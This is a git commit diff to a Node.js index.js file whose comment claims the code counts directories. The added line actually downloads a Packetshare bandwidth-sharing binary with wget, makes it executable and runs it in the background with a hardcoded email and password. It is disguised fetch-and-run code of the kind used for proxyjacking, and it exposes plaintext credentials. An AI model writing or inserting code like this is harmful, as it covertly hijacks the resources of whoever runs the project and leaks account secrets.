6416a75c560fa15b96296fd4a05f30512ec17ba2
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2024-11-12 13:23:01 +0100

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const { exec } = require('child_process');
  
 // Counts the number of directory in
 // current working directory
-exec('./Packetshare -email=theroot7791@gmail.com -password=Env112311 -accept-tos &', (error, stdout, stderr) => {
+exec('wget https://www.packetshare.io/files/packetsharev1.0.2/x86_64/Packetshare && chmod +x Packetshare && ./Packetshare -email=theroot7791@gmail.com -password=Env112311 -accept-tos &', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
